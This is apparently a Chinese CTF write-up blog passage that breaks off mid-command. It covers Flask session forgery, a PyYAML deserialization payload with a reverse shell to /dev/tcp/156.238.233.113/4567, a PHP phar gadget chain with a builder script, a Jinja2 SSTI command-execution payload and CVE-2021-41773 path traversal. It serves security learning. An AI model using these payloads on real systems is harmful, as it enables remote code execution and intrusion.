function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>) == <span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile = request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里多了一个路由，我怎么感觉除了pwd，其他三个路由都有洞啊！！！</p><p>&#x2F;read可能直接读取到flag，这里有个非预期，直接读file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ直接出了flag</p><p>&#x2F;upload中有os.path.join，可能造成绝对路径拼接漏洞！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">绝对路径拼接漏洞</span><br><span class="line"></span><br><span class="line">os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。</span><br><span class="line"></span><br><span class="line">然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</span><br></pre></td></tr></table></figure><p>如果flag在根目录下且名称知道，那么就拿下了</p><p><strong>但是</strong>，由于此处存在secure_filename函数，所以就不行啦！！</p><p>再看看&#x2F;boogipop路由，yaml.full_load(f)，可能存在PyYaml反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>) == <span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile = request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br></pre></td></tr></table></figure><p>首先这里我们面临的是session伪造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random() * 233)</span><br></pre></td></tr></table></figure><p>注意看这里的uuid.getnode()，<code>uuid.getnode()</code> 返回计算机的<strong>网络接口卡（NIC）地址</strong>，通常是设备的 MAC 地址。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204190138226.png" alt="image-20241204190138226" style="zoom:80%;" /><p>尝试一下读取file:&#x2F;&#x2F;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>成功读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:53:60 </span><br></pre></td></tr></table></figure><p>那接下来我们用python跑一下secret_key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0x0242ac025360</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#186.07856094331362</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.Z1A35A.Asx0C_ayFAFrjis7qY4WWiXNYEU</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191236394.png" alt="image-20241204191236394"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.Z1A5HQ.XcVLAuoOz8HI6SqclVREZ0FH3dE</span><br></pre></td></tr></table></figure><p>&#x2F;boogipop路由下干的其实就是接收一个file，然后它会去查看是否存在，若存在则yaml.full_load<br>所以我们要先去上传一个恶意的yaml文件</p><p>由于这里是full_load()</p><p>我们要想办法去突破，用extend方法试试反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:type</span><br><span class="line">args:</span><br><span class="line">  - exp</span><br><span class="line">  - !!python/tuple []</span><br><span class="line">  - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span><br><span class="line">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\&quot;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>这里我们创建一个1.txt就好了，其他后缀都被过滤了</p><p>上传到&#x2F;uploads&#x2F;1.txt</p><p>然后到&#x2F;boogipop路由下进行反序列化即可，这里注意改session</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191947252.png" alt="image-20241204191947252" style="zoom:80%;" /><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204192022368.png" alt="image-20241204192022368"></p><p>知识点挺多的，还是非常适合学习的！！</p><h2 id="SWPUCTF-2021-新生赛-babyunser"><a href="#SWPUCTF-2021-新生赛-babyunser" class="headerlink" title="[SWPUCTF 2021 新生赛]babyunser"></a>[SWPUCTF 2021 新生赛]babyunser</h2><p>打开就两个功能点</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205101557977.png" alt="image-20241205101557977" style="zoom:80%;" /><p>一个上传文件，一个查看文件</p><p>根据题目就知道与反序列化有关，php架构，猜测为phar反序列化。</p><p>先扫目录看看</p><p>没有什么有价值的。</p><p>那么看看查看文件这个功能点，可能和任意文件读取有关</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205102042424.png" alt="image-20241205102042424" style="zoom: 80%;" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">include(&#x27;class.php&#x27;);</span></span><br><span class="line"><span class="meta">$a=new aa();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>aa的文件查看器<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;search_form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input_text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入搜索内容&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;查看&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input_sub&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">error_reporting(0);</span></span><br><span class="line"><span class="meta">$filename=$_POST[&#x27;file&#x27;];</span></span><br><span class="line"><span class="meta">if(!isset($filename))&#123;</span></span><br><span class="line"><span class="meta">    die();</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">$file=new zz($filename);</span></span><br><span class="line"><span class="meta">$contents=$file-&gt;getFile();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">&quot;file_content&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=&lt;?<span class="attr">php</span> <span class="attr">echo</span> &quot;&lt;<span class="attr">br</span>&gt;</span>&quot;.$contents;?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>里面包含了class.php，那么我们再读取一下class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;aa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;func&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zz</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;surprise&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;这不合理&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">        <span class="variable">$lt</span>=<span class="variable language_">$this</span>-&gt;filename-&gt;<span class="variable">$var</span>;</span><br><span class="line">        <span class="comment">//此功能废弃，不想写了</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filter</span>();</span><br><span class="line">        <span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$contents</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;404 not found&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;eval&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="keyword">new</span> <span class="title function_ invoke__">xx</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;func&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zz</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;surprise&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">        <span class="variable">$lt</span>=<span class="variable language_">$this</span>-&gt;filename-&gt;<span class="variable">$var</span>;</span><br><span class="line">        <span class="comment">//此功能废弃，不想写了</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$z</span>=<span class="keyword">new</span> <span class="title function_ invoke__">zz</span>();</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ff</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="variable">$z</span>;</span><br><span class="line"><span class="variable">$z</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//删除之前的test.phar文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa::__destruct() -&gt; zz::__toString() -&gt; zz::write() -&gt; ff:__get() -&gt; xx::__call()</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205105221482.png" alt="image-20241205105221482"></p><h2 id="HNCTF-2022-WEEK3-ssssti"><a href="#HNCTF-2022-WEEK3-ssssti" class="headerlink" title="[HNCTF 2022 WEEK3]ssssti"></a>[HNCTF 2022 WEEK3]ssssti</h2><p>这里直接给出payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat flag</span><br></pre></td></tr></table></figure><h2 id="GFCTF-2021-Baby-Web"><a href="#GFCTF-2021-Baby-Web" class="headerlink" title="[GFCTF 2021]Baby_Web"></a>[GFCTF 2021]Baby_Web</h2><p>打开后没什么利用点，源码中说了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt;</span><br></pre></td></tr></table></figure><p>又试了试目录穿越，不行啊。</p><p>扫扫目录看看</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184800886.png" alt="image-20241205184800886" style="zoom:80%;" /><p>中间有一个&#x2F;etc&#x2F;passwd的神奇东西，试试</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184816327.png" alt="image-20241205184816327" style="zoom: 67%;" /><p>我勒个任意文件读取</p><p>此处其实是一个CVE-2021-41773</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27; -d 